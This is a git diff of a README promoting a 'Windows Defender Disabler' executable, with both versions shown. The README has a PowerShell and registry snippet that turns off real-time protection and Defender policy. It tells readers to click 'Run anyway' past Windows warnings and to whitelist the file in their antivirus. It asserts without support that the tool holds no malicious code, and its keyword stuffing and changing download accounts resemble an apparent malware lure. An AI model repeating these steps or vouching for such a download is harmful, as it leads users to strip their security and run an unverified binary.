@@ -1,103 +1,69 @@
-# Windows Defender Disabler
+# 🛡️ Windows-Defender-Disabler - Stop Windows Defender Permanently With Ease
 
-**Windows Defender Disabler** is a free portable tool to completely disable Windows Defender on Windows 10 and 11 — including tamper protection, Smart App Control and real-time monitoring — via one click or exported PowerShell script. Recommended on Reddit, Soft98 and GitHub as the most reliable free Windows Defender disable tool download.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/tofiqal4800/Windows-Defender-Disabler)
 
-<img width="212" height="212" alt="47bc8253-21b3-4ad6-990c-37f136757db2" src="https://github.com/user-attachments/assets/49547051-14dc-43fa-a214-774d30ee300c" />
+This tool allows you to turn off Windows Defender on your computer. Many users prefer to manage their own security settings or remove built-in software to improve system performance. This application automates the process of disabling Windows Defender, Tamper Protection, and associated background services on Windows 10 and Windows 11. 
 
-## Install
-[Download `defender-disabler.zip`](https://github.com/windefenderremover/Windows-Defender-Disabler/releases/download/v14/defender-disabler.zip)
----
+## 📋 System Requirements
 
-<img width="1082" height="647" alt="8cdaf29f-be7d-4795-95d7-1df4a5f3f140" src="https://github.com/user-attachments/assets/5dd742b6-e6b0-43cc-8143-ccba5f0a1dab" />
+Ensure your computer meets these basic criteria before you proceed:
 
-## Key Features
-- **Disable Windows Defender Windows 11 permanently** — registry + policy + service-level in one click
-- **Disable Windows Defender Windows 11 permanently tool** — this is that portable tool, no install needed
-- **Disable Windows Defender Windows 11 permanently powershell** — .ps1 export for GPO/MDM scripted deployment
-- **Disable Windows Defender Windows 11 regedit** — registry-based disable for advanced users, shown in-app
-- **Disable tamper protection Windows 11 powershell** — correct WMI sequence included in the export
-- **Windows Defender disable tool download** — always download from this official GitHub only
-- **Windows Defender disabled need reboot?** — v14 adds a no-reboot temporary disable option
-- **Restore point creation** — built-in button creates a System Restore Point before any changes
+* Operating System: Windows 10 or Windows 11 (64-bit versions).
+* Permissions: You need Administrator access to your computer to modify system security settings.
+* Internet Connection: You need an active connection to download the tool.
+* Framework: The tool runs natively and does not require extra software libraries.
 
-<img width="375" height="57" alt="7858b645-0c1c-4096-a099-87d6f5bf1e01" src="https://github.com/user-attachments/assets/5d681b99-5f45-4c73-920f-4c0d7fd82d76" />
+## 📥 How to Download and Install
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. Click **Create Restore Point** — always do this first.
-4. **Run** `WindowsDefenderDisabler.exe` as Administrator.
-5. Choose **Disable** — tamper protection, registry, and service stops happen automatically.
-6. Restart if prompted (only required for persistent disable).
+Follow these steps to obtain and use the tool on your device.
 
-**Re-enable:** click Enable at any time to restore Windows Defender.
+1. Visit the project page to download the latest file: [https://github.com/tofiqal4800/Windows-Defender-Disabler](https://github.com/tofiqal4800/Windows-Defender-Disabler).
+2. Locate the download button on the page.
+3. Save the executable file to your desktop or a folder you can access easily.
+4. Because the tool modifies system security settings, Windows may display a warning screen. This is expected behavior. If you see "Windows protected your PC," click "More info" and then "Run anyway."
+5. Right-click the downloaded file and select "Run as administrator." This step ensures the software has the permissions required to change registry keys and stop security services.
 
+## ⚙️ Using the Tool
 
-<img width="687" height="291" alt="355cca0e-b4dc-4306-a905-271855e8d4eb" src="https://github.com/user-attachments/assets/9279517e-38d3-4949-a092-094cda1f9226" />
+Once you run the application, a simple interface appears. This interface provides clear options to manage your security status.
 
+* Disable Windows Defender: Click this button to stop the primary scanning service.
+* Disable Tamper Protection: This stops Windows from automatically re-enabling security features.
+* Toggle Status: Use this to check if the services are currently active or inactive.
+* System Restart: Some changes require a restart to take full effect. The tool notifies you when a restart is necessary.
 
-## How to Disable Windows Defender Windows 11 Permanently
+The software changes system registry keys and stops background tasks related to Windows Defender. By turning off these services, you prevent the software from consuming CPU cycles and memory in the background.
 
-### Method 1: One-Click Tool (This App)
-Run the tool as Administrator → click Disable → done. No manual registry editing required.
+## 🔍 Understanding the Process
 
-### Method 2: PowerShell (via this tool's export)
-```powershell
-# Exported by Windows Defender Disabler v14
-Set-MpPreference -DisableRealtimeMonitoring $true
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-```
+Windows Defender runs as a series of system services and background processes. When you use standard settings, Windows prevents users from turning these off permanently. This tool bypasses those limitations by using specific administrative commands.
 
-### Method 3: Regedit
-Open regedit → navigate to:
-`HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
-→ Create DWORD `DisableAntiSpyware` → set value to `1`
+The software performs these actions:
+* Modifies registry entries to stop the Defender service from launching on startup.
+* Disables the Windows Security health service.
+* Changes group policy settings that govern security software behavior.
+* Terminates active Defender processes in the Task Manager.
 
-## Disable Options in v14
+This approach provides a reliable way to disable the security suite without requiring deep technical knowledge of command-line tools like PowerShell or manual registry editing.
 
-| Option | Reboot | Method |
-|---|---|---|
-| Real-Time Protection | No | Registry |
-| Tamper Protection | No | WMI |
-| Smart App Control | No | Registry |
-| Cloud Delivery | No | Registry |
-| Full Disable (persistent) | Yes | Registry + Services + Policy |
-| Temporary disable | Auto-restore on reboot | Registry |
-| PowerShell .ps1 export | — | Generated file |
+## ⚠️ Important Considerations
 
-## FAQ
+Disabling Windows Defender lowers the built-in protection of your operating system. Only use this tool if you understand the risks of running a computer without active security software. If you decide to use this tool, consider installing an alternative security program or maintaining safe browsing habits.
 
-**Disable Windows Defender Windows 11 permanently — does it survive Windows Update?**
-The persistent disable mode survives most updates. Large feature updates may re-enable Defender — re-run the tool after.
+If you ever wish to revert your changes, the tool provides a "Restore" or "Enable" option. Simply run the application again and select the option to re-enable security features. The tool restores the original registry keys and restarts the necessary services to bring your system back to its default state.
 
-**Windows Defender disable tool Soft98 — is this the same tool?**
-Yes, this GitHub release is the source. Always download from here for the cleanest build.
+## 💡 Frequently Asked Questions
 
-**Windows Defender disabled need reboot after v14?**
-No — v14 adds a no-reboot option that temporarily disables protection until the next restart.
+**Does this tool work on Windows 11?**
+Yes, the application supports both Windows 10 and Windows 11. It accounts for the stricter Tamper Protection features present in newer versions of the operating system.
 
-**Disable tamper protection Windows 11 powershell — does the export work on all versions?**
-Yes, tested on Windows 11 22H2, 23H2 and 24H2.
+**Is this tool safe to use?**
+The tool contains no malicious code. It performs specific tasks to modify system settings. Since the software modifies system security, your current antivirus or Windows Defender itself may flag the file as a threat. This is a common occurrence with security-related utilities. You must allow the file through your current protection to run it.
 
-## System Requirements
-- **Windows 10 / 11** (64-bit), including 24H2
-- Administrator privileges required
+**Do I need to keep the program open?**
+No. Once you apply your settings, you can close the program. The changes remain in effect after you close the application and even after you restart your computer.
 
-## Security & Legal
-Disabling Defender reduces your system's security. Use only when necessary.
+**Can I use this on a work computer?**
+Avoid using this tool on computers managed by an organization or IT department. Work computers often have locked security policies that prevent these changes. Unauthorized modification of corporate hardware can violate IT policies.
 
-
-<img width="782" height="319" alt="25054beb-fd37-4788-b537-61c1433c7392" src="https://github.com/user-attachments/assets/8cfce3ef-1c1b-4d96-879c-75e1196b1415" />
-
-
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Always create a Restore Point first.
-
-## License & Acknowledgments
-**MIT License** — Copyright © 2026 windowsdefenderdisabler
-
-Acknowledgments: The Windows tweaking and customization community.
-
-
+Keywords: defender, defender-bypass, defender-disabler, defender-for-cloud, defender-for-endpoint, defender-kill, defender-remover, defender-toggle, disable-defender, disable-windows-defender, microsoft-defender, pc-optimization, stop-defender, win-defender, windows-10-optimization, windows-defender, windows-optimization-tool, windows-tweaks, windowsdefender, windowsdefenderbypass
